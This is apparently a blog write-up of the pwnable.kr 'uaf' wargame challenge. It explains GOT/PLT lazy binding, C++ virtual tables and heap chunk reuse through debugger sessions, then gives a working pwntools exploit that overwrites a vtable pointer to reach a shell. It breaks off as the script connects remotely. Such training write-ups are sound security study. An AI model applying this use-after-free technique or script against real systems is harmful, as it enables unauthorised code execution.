this is another pretty simple challenge that was part of pwnable.kr's "Toddler's Bottle" section
of the wargame. It is a pretty use after free vulnerability that incorporates some OOP concepts
into it. The premise of this challenge is to free an object pointer without the dangling pointer
being destroyed, then "use".

We will go into what this option does later as i am just summarizing this binary, but we will "after"
twice, again i will elaborate, then "use". This will give us a shell through an inherited virtual
function that is lazily/dynamically binded/resolved. I will also be explaining virtual functions
and their place within object inheritance and polymorphism.

As popular as uaf bugs are within browsers, they are not a one man army when attempting to gain code
execution, but may greatly aid in it. They are similar to fsb bugs in a way, as they will enable us
to either edit a free chunk, groom the heap to allow us to interact with an object, or under certain
special conditions provide us with a read write what where.

In most cases, we will be stuck with the first two possibilities, editing a free chunk and r/w access
on a chunk we can groom. This can be vital, as a massive attack vector is the ability to overwrite heap
metadata in which we will get into later with the unlink explanation, and the houses of techniques.

anyways, lets get started on this challenge, this time the binary was written in c++, and involves
classes instead of the simple structures we are so used to. This is where Use After Free vulnerabilities
shine, as c++'s OOP ecosystem is much much more mature and sophisticated.

We have 3 different labels or sections to the object, as there are public, protected, and private
sections of our class. We also have strange keywords that can be used within a class like the
virtual keyword. This is used mainly, to achieve runtime polymorphism and inheritance.

Now for the attempt at explaining how virtual functions work, and their uses within object polymorphism,
and inheritance. If you are already familiar with the Global Offset Table and Procedure Linkage
Table, you will know that it will DYNAMICALLY resolve the addresses wtihin libc right? Now, that
is due to the fact that ASLR exists within the system, so the binary and libc wont be loaded into
memory at the same time to prevent reliable exploitation of the software.

Of course, there are much more reasons for dynamic binaries, but that is one of them. If you do now
know already, the premise of how the GOT/PLT work in tandem to dynamically resolve addresses of functions
within libc is that, when we make a call to, lets say printf(). Within a dynamic binary that is actually
calling the Procedure Linkage Table, or PLT for short. When we call printf@plt, it will jump to the
PLT, which will THEN jump into the Global Offset Table, or GOT for short, to check to see if the address
of that function has already been resolved.

If it has NOT been resolved, then it will jump BACK to the PLT and will jmp to a magical function called
"_\_dl_runtime_resolve". This function will introduce a brand new exploitation technique called
ret2dl_resolve, which is a technique that bypasses ASLR, AND does not need libc offsets. This technique
consists of constructing a fake symbols table, and allowing _\_dl_resolve_runtime to resolve the address
to a location in memory where we control.

It is an extremely useful technique that I will be creating a post about that technique as well, lets
visualize this in our debugger.

here is the sample code for our demonstration of the GOT/PLT:

```c
int main() {
    printf("A\n");

    getchar();

    printf("B");
}
```

as we can see, it is an extremely simple script that will attempt to resolve 2 functions within the GOT.
compile with no pie, and open it up in gdb.

```nasm
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:     push   rbp
   0x0000000000401137 <+1>:     mov    rbp,rsp
   0x000000000040113a <+4>:     mov    edi,0x41
   0x000000000040113f <+9>:     call   0x401030 <putchar@plt>
   0x0000000000401144 <+14>:    mov    eax,0x0
   0x0000000000401149 <+19>:    call   0x401040 <getchar@plt>
   0x000000000040114e <+24>:    mov    edi,0x42
   0x0000000000401153 <+29>:    call   0x401030 <putchar@plt>
   0x0000000000401158 <+34>:    mov    eax,0x0
   0x000000000040115d <+39>:    pop    rbp
   0x000000000040115e <+40>:    ret
End of assembler dump.
gef➤
```

now, as we can see, after we disassemble the main function, we will notice that it will make a call to
putchar instead of printf, as gcc is a optimal in which functions we use. This will not affect the
POC, but we can see that it will "call putchar@plt". Okay, so it will make a call to the procedure
linkage table, what does that do?

lets disassemble that plt entry:

```nasm
gef➤  disas 0x401030
Dump of assembler code for function putchar@plt:
   0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <putchar@got.plt>
   0x0000000000401036 <+6>:     push   0x0
   0x000000000040103b <+11>:    jmp    0x401020
End of assembler dump.
gef➤
```

okay, so we can see that it will make a jmp to the Global Offset Table, GOT or .got.plt for short. Lets
see what this function does?

```nasm
gef➤  disas 0x404018
Dump of assembler code for function putchar@got.plt:
   0x0000000000404018 <+0>:     adc    BYTE PTR ss:[rax+0x0],al
   0x000000000040401c <+4>:     add    BYTE PTR [rax],al
   0x000000000040401e <+6>:     add    BYTE PTR [rax],al
End of assembler dump.
gef➤
```

okay, so it will simply store data, we will usually see add byte ptr [register], al when dealing with
storing data, c style. Since this GOT entry holds 4 empty bytes, we can assume that putchar has
not been resolved yet right?

okay, well since there are no instructions here to disassemble, lets check the values left on this
empty entry to putchar().

```nasm
gef➤  x/gx 00x404018
0x404018 <putchar@got.plt>:       0x0000000000401036
gef➤
```

okay well this seems strange, it look as though there will be an address stored here, what resides here?

```nasm
gef➤  disas 0x0000000000401036
Dump of assembler code for function putchar@plt:
   0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <putchar@got.plt>
   0x0000000000401036 <+6>:     push   0x0
   0x000000000040103b <+11>:    jmp    0x401020
End of assembler dump.
gef➤
```

and were back to our PLT!

Okay, so now we have proved the following, the PLT will jump to the global offset table for resolved
addresses, if not, then it will jump BACK to the PLT entry, and continue execution.

Okay, so whats next?

How do we get to our function? How do we know where it is?

okay, lets start our binary now then, and then inspect the memory mappings of the program:

```nasm
gef➤  info proc mappings
process 4980
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /root/research/pwn/heap/a.out
            0x401000           0x402000     0x1000     0x1000 /root/research/pwn/heap/a.out
            0x402000           0x403000     0x1000     0x2000 /root/research/pwn/heap/a.out
            0x403000           0x404000     0x1000     0x2000 /root/research/pwn/heap/a.out
            0x404000           0x405000     0x1000     0x3000 /root/research/pwn/heap/a.out
      0x7ffff7dc2000     0x7ffff7dc4000     0x2000        0x0
      0x7ffff7dc4000     0x7ffff7dea000    0x26000        0x0 /usr/lib/libc-2.33.so
      0x7ffff7dea000     0x7ffff7f36000   0x14c000    0x26000 /usr/lib/libc-2.33.so
      0x7ffff7f36000     0x7ffff7f82000    0x4c000   0x172000 /usr/lib/libc-2.33.so
      0x7ffff7f82000     0x7ffff7f85000     0x3000   0x1bd000 /usr/lib/libc-2.33.so
      0x7ffff7f85000     0x7ffff7f88000     0x3000   0x1c0000 /usr/lib/libc-2.33.so
      0x7ffff7f88000     0x7ffff7f93000     0xb000        0x0
      0x7ffff7fc6000     0x7ffff7fca000     0x4000        0x0 [vvar]
      0x7ffff7fca000     0x7ffff7fcc000     0x2000        0x0 [vdso]
      0x7ffff7fcc000     0x7ffff7fcd000     0x1000        0x0 /usr/lib/ld-2.33.so
      0x7ffff7fcd000     0x7ffff7ff1000    0x24000     0x1000 /usr/lib/ld-2.33.so
      0x7ffff7ff1000     0x7ffff7ffa000     0x9000    0x25000 /usr/lib/ld-2.33.so
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x2e000 /usr/lib/ld-2.33.so
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x30000 /usr/lib/ld-2.33.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gef➤
```

okay, so we can see that libc is loaded within libc, and these address will always start with a 0x7ffff.
We should keep that in mind when we are inspecting the GOT.

okay, lets set breakpoints on both getchar and putchar's plt entry so it wont be called without us
noticing

```nasm
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:     push   rbp
   0x0000000000401137 <+1>:     mov    rbp,rsp
=> 0x000000000040113a <+4>:     mov    edi,0x41
   0x000000000040113f <+9>:     call   0x401030 <putchar@plt>
   0x0000000000401144 <+14>:    mov    eax,0x0
   0x0000000000401149 <+19>:    call   0x401040 <getchar@plt>
   0x000000000040114e <+24>:    mov    edi,0x42
   0x0000000000401153 <+29>:    call   0x401030 <putchar@plt>
   0x0000000000401158 <+34>:    mov    eax,0x0
   0x000000000040115d <+39>:    pop    rbp
   0x000000000040115e <+40>:    ret
End of assembler dump.
gef➤  b* 0x401030
Breakpoint 1 at 0x401030
gef➤  b* 0x401040
Breakpoint 2 at 0x401040
gef➤
```

okay, lets continue program execution until getchar(), and inspect the GOT of putchar again:

```nasm
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:     push   rbp
   0x0000000000401137 <+1>:     mov    rbp,rsp
   0x000000000040113a <+4>:     mov    edi,0x41
   0x000000000040113f <+9>:     call   0x401030 <putchar@plt>
   0x0000000000401144 <+14>:    mov    eax,0x0
   0x0000000000401149 <+19>:    call   0x401040 <getchar@plt>
   0x000000000040114e <+24>:    mov    edi,0x42
   0x0000000000401153 <+29>:    call   0x401030 <putchar@plt>
   0x0000000000401158 <+34>:    mov    eax,0x0
   0x000000000040115d <+39>:    pop    rbp
   0x000000000040115e <+40>:    ret
End of assembler dump.
gef➤  disas 0x401030
Dump of assembler code for function putchar@plt:
   0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <putchar@got.plt>
   0x0000000000401036 <+6>:     push   0x0
   0x000000000040103b <+11>:    jmp    0x401020
End of assembler dump.
gef➤  disas 0x404018
Dump of assembler code for function putchar@got.plt:
   0x0000000000404018 <+0>:     nop
   0x0000000000404019 <+1>:     leave
   0x000000000040401a <+2>:     jrcxz  0x404013
   0x000000000040401c <+4>:     (bad)
   0x000000000040401d <+5>:     jg     0x40401f <putchar@got.plt+7>
   0x000000000040401f <+7>:     add    BYTE PTR [rsi+0x10],al
End of assembler dump.
gef➤  x/x 0x404018
0x404018 <putchar@got.plt>:     0x00007ffff7e3c990
gef➤
```

okay, now we can see that the address of putchar has been populated with the Global Offset Table, or
the .got.plt section of the binary within memory. Rememer how we have previously stated that libc
functions within virtual memory will start at 7ffff?, that looks an awful lot like a libc address
to me.

Here is the pseudocode in how dynamic resolution works:

```c
void putchar@plt() {
    if (putchar@got) {
        jmp putchar@got
    } else {
        putchar@got = __dl_runtime_resolve(putchar);
        jmp putchar@got
    }
}
```

I did not explain the GOT/PLT in depth, but I will also be writing another post on that topic. If you
understand the concept now, it should not bo too hard to piece each concept together. With polymorphism
and inheritance, there will be a need to replace the base class's contructor or member with another
that serves a different purpose. a virtual function will serve this purpose, as its address within
the virtual table IS NOT STATIC. This means that it can constantly be updated and re-resolved, while
static members of the class will be selected AT COMPILE TIME. It cannot change anymore, that function
will stay that function, forever.

okay, lets finally take a look at the source of the binary:

```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

okay, so as we have previously stated, this script will have a base class/object that we can inherit
to or from. If you are not familiar in these c++ OOP concepts i highly reccomend you read up on those
before continuing as they are relevant to the understanding of the binary.

as we have already explained, there is a virtual function by the name of introduce, that can be shared
and inherited across different objects. Each virtual function will have an entry within the vtable, you
do not have to redeclare the function as virtual, since the Man and Woman class have already inherited
from the Human class, but i guess it will make things more concise.

So this function is shared, and can be redeclared across objects right? cool, so where is our
vulnerability within this?

There is no vulnerability inherently within our classes, besides the inherited virtual function of
give_shell(). This is simply just a plain old project on c++ inheritance. Lets take another look at the
main functions then, where do our vulnerabilities lie here?

```cpp

	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

we can spot several here, like how our pointers m and w are not destroyed/nulled after they have been deleted.
this means that we will have a quick and easy dangling pointer to where m and w used to reside. cool, what can
we do with it, how can we call a shell?

well lets take a look at the second option, which goes by the name "after". Lets take a look at what this does.

```cpp
        len = atoi(argv[1]);
        data = new char[len];
        read(open(argv[2], O_RDONLY), data, len);
        cout << "your data is allocated" << endl;
```

okay, so it will convert argv[1] into an integer, and allocate a char array if the size we provide. It will then
open a file of our choice, and read it into the allocated chunk. It will then notify us that our data has been
allocated.

the third option within our binary is to "free", which will simply delete both m and w objects. So in order to
achieve a dangling pointer, we will have to use this option first.

and writing to a file is a pain, so lets think of a way around this. open will return a file descriptor right?, and
it will return an fd to read from. So what if we were to pass open() a stdin file descriptor?

The open system call still requires a file though, but everything in linux is a file, so after some searching i had
discovered "/dev/stdin" that will act as the 0 fd for the system. If we were to pass /dev/stdin as a parameter
instead of a file, it will prompt us with an input instead which is much more stable than reading from a file.

okay, lets test this out on the binary:

```
1. use
2. after
3. free
3

1. use
2. after
3. free
2
aaaaaaaa
your data is allocated

1. use
2. after
3. free
2
aaaaaaaa
your data is allocated

1. use
2. after
3. free
1
[1]    12282 segmentation fault (core dumped)  ./uaf 24 /dev/stdin
```

okay well, it seems as though if we were to free both pointers, then allocate 24 byte chunks, it will cause
a segmentation fault. We need to make sure that this exploitable, so lets open this binary up in gdb and rerun
our previous commands

```nasm
gef➤  start
[*] gdb is already running
gef➤  c
Continuing.
1. use
2. after
3. free
3
1. use
2. after
3. free
2
AAAAAAAA
your data is allocated
1. use
2. after
3. free
2
AAAAAAAA
your data is allocated
1. use
2. after
3. free
1

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400fd8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x4141414141414149 ("IAAAAAAA"?)
$rbx   : 0x0000000000614f30  →  "AAAAAAAA"
$rcx   : 0xffffff00
$rdx   : 0x00007fffffffdc48  →  0x0000000000000001
$rsp   : 0x00007fffffffdc00  →  0x00007fffffffdd58  →  0x00007fffffffe125  →  "/root/research/pwn/heap/uaf"
$rbp   : 0x00007fffffffdc60  →  0x0000000000000000
$rsi   : 0x0
$rdi   : 0x00007ffff7f90540  →  0x0000000000000000
$rip   : 0x0000000000400fd8  →  <main+276> mov rdx, QWORD PTR [rax]
$r8    : 0xa
$r9    : 0x00000000006020f0  →  0x00007ffff7f87998  →  0x00007ffff7ec5680  →  <virtual+0> endbr64
$r10   : 0x0
$r11   : 0x246
$r12   : 0x00007fffffffdc20  →  0x0000000000614f18  →  0x000000006c6c694a ("Jill"?)
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc00│+0x0000: 0x00007fffffffdd58  →  0x00007fffffffe125  →  "/root/research/pwn/heap/uaf"    ← $rsp
0x00007fffffffdc08│+0x0008: 0x000000030000ffff
0x00007fffffffdc10│+0x0010: 0x0000000000614ec8  →  0x000000006b63614a ("Jack"?)
0x00007fffffffdc18│+0x0018: 0x0000000000401177  →  <_GLOBAL__sub_I_main+19> pop rbp
0x00007fffffffdc20│+0x0020: 0x0000000000614f18  →  0x000000006c6c694a ("Jill"?)  ← $r12
0x00007fffffffdc28│+0x0028: 0x0000000000614ee0  →  "AAAAAAAA"
0x00007fffffffdc30│+0x0030: 0x0000000000614f30  →  "AAAAAAAA"
0x00007fffffffdc38│+0x0038: 0x0000000000000008
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400fcc <main+264>       add    BYTE PTR [rax-0x75], cl
     0x400fcf <main+267>       rex.RB enter 0x8b48, 0x0
     0x400fd4 <main+272>       add    rax, 0x8
 →   0x400fd8 <main+276>       mov    rdx, QWORD PTR [rax]
     0x400fdb <main+279>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fdf <main+283>       mov    rdi, rax
     0x400fe2 <main+286>       call   rdx
     0x400fe4 <main+288>       mov    rax, QWORD PTR [rbp-0x30]
     0x400fe8 <main+292>       mov    rax, QWORD PTR [rax]
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400fd8 in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400fd8 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

okay, this is the interesting snipper from the disassembly of main:

```nasm
     0x400fcc <main+264>       add    BYTE PTR [rax-0x75], cl
     0x400fcf <main+267>       rex.RB enter 0x8b48, 0x0
     0x400fd4 <main+272>       add    rax, 0x8
 →   0x400fd8 <main+276>       mov    rdx, QWORD PTR [rax]
     0x400fdb <main+279>       mov    rax, QWORD PTR [rbp-0x38]
     0x400fdf <main+283>       mov    rdi, rax
     0x400fe2 <main+286>       call   rdx
     0x400fe4 <main+288>       mov    rax, QWORD PTR [rbp-0x30]
     0x400fe8 <main+292>       mov    rax, QWORD PTR [rax]
```

okay, what is this piece of code doing? It looks as though some value will be moved into rax, it will then
add the rax pointer by 8, and then dereference that pointer to store in rdx. That part is what broke the
program though right? Lets see what value is actually stored within rax that caused the dereference to break
when attempting to access that memory region:

```nasm
gef➤  x/x $rax
0x4141414141414149:     Cannot access memory at address 0x4141414141414149
gef➤  
```

oh what, our input??

okay, so if we supply a memory address to jump to, instead of junk bytes, we should be able to hijack program
control since it will later "call rdx" on our pointer right? What about that 0x49 at the end though, whats up
with that?

Lets take a look at the important source of the binary to figure out what is actually going on:

option 1:

```cpp
        switch(op){
            case 1:
                m->introduce();
                w->introduce();
                break;
```

base human class:

```cpp
class Human{
private:
    virtual void give_shell(){
        system("/bin/sh");
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout << "My name is " << name << endl;
        cout << "I am " << age << " years old" << endl;
    }
};
```

So since we understand virtual functions, we know that it will be inherited and allowed to be redeclared in
another object that is not the base thanks to dynamic/lazy binding/resolution of the functions within the vtable.

Since none of the other classes will REDECLARE this virtual function, it will simply be inherited into each Man and
Woman class/object. 

Okay, but this still doesnt explain how our input became the m->introduce() and w->introduce() function calls, and
why does our 0x4141414141414141 have an extra decimal 8 value inside of it?

lets inspect our object in memory, as well as statically observe the virtual table for each object, since it is a
method within a class, lets first see what radare has for us:

```nasm
[0x00401560]> s method.
method.Human.give_shell__
method.Woman.virtual_0
method.Man.virtual_0
method.Human.virtual_0
method.Human.introduce__
method.Human.virtual_8
method.Human.Human__
method.Man.Man_std::string__int_
method.Man.introduce__
method.Man.virtual_8
method.Woman.Woman_std::string__int_
method.Woman.introduce__
method.Woman.virtual_8
method.std::ostream.operator___int_
method.std::ios_base::Init.Init__
method.std::basic_ostream_char__std::char_traits_char____std::operator____std.char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
method.std::basic_string_char__std::char_traits_char___std::allocator_char___.basic_string__
method.std::basic_string_char__std::char_traits_char___std::allocator_char___.basic_string_char_const__std::allocator_char__const_
method.std::basic_ostream_char__std::char_traits_char____std::operator____char__std::char_traits_char___std.allocator_char____std::basic_ostream_char__std::char_traits_char_____std::basic_string_char__std::char_traits_char___std::allocator_char____cons
method.std::ostream.operator___std::ostream____std::ostream__
method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____
method.std::allocator_char_.allocator__
method.std::string.operator_std::string_const_
method.std::istream.operator___unsigned_int_
[0x00401560]> s method.Man.
method.Man.virtual_0               method.Man.Man_std::string__int_   method.Man.introduce__             method.Man.virtual_8
^C

[0x00401560]>
[0x00401560]> s method.
method.Human.give_shell__
method.Woman.virtual_0
method.Man.virtual_0
method.Human.virtual_0
method.Human.introduce__
method.Human.virtual_8
method.Human.Human__
method.Man.Man_std::string__int_
method.Man.introduce__
method.Man.virtual_8
method.Woman.Woman_std::string__int_
method.Woman.introduce__
method.Woman.virtual_8
method.std::ostream.operator___int_
method.std::ios_base::Init.Init__
method.std::basic_ostream_char__std::char_traits_char____std::operator____std.char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
method.std::basic_string_char__std::char_traits_char___std::allocator_char___.basic_string__
method.std::basic_string_char__std::char_traits_char___std::allocator_char___.basic_string_char_const__std::allocator_char__const_
method.std::basic_ostream_char__std::char_traits_char____std::operator____char__std::char_traits_char___std.allocator_char____std::basic_ostream_char__std::char_traits_char_____std::basic_string_char__std::char_traits_char___std::allocator_char____cons
method.std::ostream.operator___std::ostream____std::ostream__
method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____
method.std::allocator_char_.allocator__
method.std::string.operator_std::string_const_
method.std::istream.operator___unsigned_int_
[0x00401560]> s method.Man.
method.Man.virtual_0               method.Man.Man_std::string__int_   method.Man.introduce__             method.Man.virtual_8
[0x00401560]> s method.Human.
method.Human.give_shell__   method.Human.virtual_0      method.Human.introduce__    method.Human.virtual_8      method.Human.Human__
[0x00401560]> s method.Human.
method.Human.give_shell__   method.Human.virtual_0      method.Human.introduce__    method.Human.virtual_8      method.Human.Human__
[0x00401560]> s method.Man.
method.Man.virtual_0               method.Man.Man_std::string__int_   method.Man.introduce__             method.Man.virtual_8
[0x00401560]> s method.Man.virtual_
method.Man.virtual_0   method.Man.virtual_8
[0x00401560]> s method.Man.virtual_)
Cannot seek to unknown address 'method.Man.virtual_)'

[0x00401560]> s method.Man.virtual_0
[0x0040117a]> pdf
            ;-- Human::give_shell():
            ;-- method.Woman.virtual_0:
            ;-- method.Man.virtual_0:
            ;-- method.Human.virtual_0:
┌ 24: method.Human.give_shell__ (int64_t arg1);
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int64_t arg1 @ rdi
│           0x0040117a      55             push rbp                    ; Human::give_shell()
│           0x0040117b      4889e5         mov rbp, rsp
│           0x0040117e      4883ec10       sub rsp, 0x10
│           0x00401182      48897df8       mov qword [var_8h], rdi     ; arg1
│           0x00401186      bfa8144000     mov edi, str._bin_sh        ; 0x4014a8 ; "/bin/sh" ; const char *string
│           0x0040118b      e830fbffff     call sym.imp.system         ; int system(const char *string)
│           0x00401190      c9             leave
└           0x00401191      c3             ret
[0x0040117a]>
```

okay, so as we can see, the man class will have the following methods stored within it, some virtual some not.

```
method.Man.virtual_0               method.Man.Man_std::string__int_   method.Man.introduce__             method.Man.virtual_8
```

so each of the unnamed virtual methods should be the inherited functions from the base Human class.
We now know that the virtual_0 method will be the inherited virtual give_shell(), but what about
virtual_8?

Well lets take a look shall we?

```nasm
[0x004012d2]> pdf
            ;-- Man::introduce():
            ;-- method.Man.virtual_8:
┌ 54: method.Man.introduce__ (int64_t arg1);
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int64_t arg1 @ rdi
│           0x004012d2      55             push rbp                    ; Man::introduce()
│           0x004012d3      4889e5         mov rbp, rsp
│           0x004012d6      4883ec10       sub rsp, 0x10
│           0x004012da      48897df8       mov qword [var_8h], rdi     ; arg1
│           0x004012de      488b45f8       mov rax, qword [var_8h]
│           0x004012e2      4889c7         mov rdi, rax
│           0x004012e5      e8a8feffff     call method Human::introduce() ; method.Human.introduce__
│           0x004012ea      becd144000     mov esi, str.I_am_a_nice_guy_ ; 0x4014cd ; "I am a nice guy!"
│           0x004012ef      bf60226000     mov edi, obj.std::cout      ; 0x602260
│           0x004012f4      e8f7f9ffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
│           0x004012f9      be600d4000     mov esi, sym.imp.std::basic_ostream_char__std::char_traits_char____std::endl_char__std::char_traits_char____std::basic_ostream_char__std::char_traits_char____ ; 0x400d60
│           0x004012fe      4889c7         mov rdi, rax
│           0x00401301      e84afaffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__
│           0x00401306      c9             leave
└           0x00401307      c3             ret
[0x004012d2]> 
```

okay so c++ disassembly is a mess, as always. But looking at the objects, functions, streams, and
strings being used within this mess, we can probably figure out that this is the Man::introduce()
function that will call the inherited method Human::introduce(), then cout "im a nice guy!". This
is a virtual function that is being redeclared here, so it is intereted as such and added to the
vtable.

Okay, it is the same deal with the Woman class/methods as they are both identical. radare2 has
some nice functions that will help us easily find virtual table entries, but that is no fun
so we will be doing this "manually" within radare.

Okay, so we already know the virtual function addresses right, we know that any Human, Man, or
Woman get_shell virtual functions will work the same since the permissions between each of them
dont change. 

Okay, so now we know what to write to our heap after it has been freed, what about our strange
0x49 problem? What is causing that?

in computation, everything works logically, and only logically. There is no common sense involved
within computer unless it is explicitly implemented. Software is not self aware until we achieve
self aware intelligence, which means until then everything will work in a logical manner. 

lets just say we have a pointer to an object with 2 methods right? Each object works the same
as a structure, it will hold a pointer to that symbol within memory instead of actually containing
it, which is what happens here. So we have 2 pointers on a 64 bit system, which would equate to
16 bytes in total. 

Okay, how would we call the first method?

```c
obj.test_object();
```

Cool, this would call the first object since the pointer is exactly where the obj pointer, points to.
What about the second object, how will our logical computer find that?

```c
*(obj.test_object + 8)();
```

this is just pseudocode, but it will look something extremely similar to this. It will "index" that object
by 8, since that is the size of the data type, that is the sizeof an address on a 64 bit system.

In the realm of the low level, there is really no such thing as strings, chars, doubles, or bools.
in the end, it is always an integer.

You might be thinking, wait what? what about a string, how is that an integer?

ascii strings are a human readable encoding of decimal, or anything within the base number system. It is
simply encoded to make each byte into a letter which allows us to create strings and chars.

In c, data type is not exactly by TYPE, as much as it is by SIZE. Each data type will contain different
SIZES that differenciate it's use cases. Lets just take a 32 bit signed integer for example. This is 4 bytes
in size, which will be allowed to store base number values into that allocated 4 byte array for our int.

so what i am trying to get at, is that in the end, everything is a number. 

Terry A. Davis had recognized this within c and did not like the strict types that the compiler forced on
each data type/size. In one of his streams, he had demonstrated an extremely interesting concept of data
representation. He did not differenciate each data type by it's encoding, but ONLY by its size. In holy
C, you could have an "I64", which is a 64 bit integer, hold 8 ascii bytes. This was extremely fascinating,
and i would love to continue but this is getting a little off track.

okay, we now know why it will add decimal 8 to our input, then call it as a function. But why does our input
end up getting executed anyways, why the hell does that happen??

If you had read part 1 of this blog post, you would have known that the minimum usable size for ptmalloc2
is 24 bytes. Anything lower than 24 bytes will not be seen as the same, and will therefore not use the
same chunk. This is simply how ptmalloc works, it will check for cached or existing chunks and either
find a perfect match, or allocate a new one.

our Man and Woman objects will both be less than or equals to 24 bytes in size, which means that as long
as we allocate below 24 bytes, we will get returned the same chunk in which our objects USED to be
allocated.

Okay, lets properly visualize this:

```cpp
c++:
Human* m = new Man("Jack", 25);
Human* w = new Woman("Jill", 21);

heap:

        pointer               pointer
          |                     |
          V                     V
[metadata][man_object][metadata][woman_object]
```

```cpp
c++:
delete m
delete w

heap:
        pointer             pointer
          |                   |
          V                   V
[metadata][0x0000000000000000]


tcache:
[metadata][woman_object]
```

```cpp
c++:
len = atoi(argv[1]);
data = new char[len];
read(open(argv[2], O_RDONLY), data, len);
cout << "your data is allocated" << endl;

heap:
        pointer               pointer
          |                     |
          V                     V
[metadata]["AAAAAAAA"]


tcache:
[metadata][woman_object]
```

```cpp
c++:
len = atoi(argv[1]);
data = new char[len];
read(open(argv[2], O_RDONLY), data, len);
cout << "your data is allocated" << endl;

heap:
        pointer                       pointer
          |                             |
          V                             V
[metadata][0x4141414141414141][metadata][0x4141414141414141]


tcache:
[metadata][woman_object]
```

```cpp
c++:
m->introduce();
w->introduce();

heap:
        pointer                       pointer
          |                             |
          V                             V
[metadata][0x4141414141414141][metadata][0x4141414141414141]


tcache:
[metadata][woman_object]


rip = 0x4141414141414141


0x4141414141414141 in ?? ()
```

boom, an we would have gotten a segmentation fault with our rip resulting in junk.

Lets write the exploit for this binary now:

```py
#!/usr/bin/env python3
from pwn import process,ssh
from fastpwn import pack,log
from sys import argv

s=lambda x,r="":p.sendlineafter(str(r),str(x)) if r else p.sendline(str(x))

if len(argv)>1 and argv[1]=="-r":
    conn=ssh("uaf","pwnable.kr",password="guest",port=2222)
    p=conn.process(["./uaf", "24", "/dev/stdin"],cwd="/home/uaf")
else:
    p=process(["./uaf", "24", "/dev/stdin"])

s(3, r="free")
s(2, r="free")
p.sendline(pack.pk64(0x00401570-8))
s(2, r="free")
p.sendline(pack.pk64(0x00401570-8))
s(1, r="free")
p.interactive()
```

so we are overwriting our introduce() virtual function with get_shell, instead of junk.
the get_shell virtual function does not matter, you can choose from an inherited class
like Man or Woman, or you can use the base classes get_shell, from Human::get_shell().

Either will work perfectly, lets test this our locally first:

```bash
[+] Starting local process './uaf': pid 13133
[*] Switching to interactive mode

$ ls
notes.md  uaf  uaf.cpp    xpl.py
$  
```

and it works perfectly, lets test this against the remote server:

```
[+] Connecting to pwnable.kr on port 2222: Done
[*] uaf@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
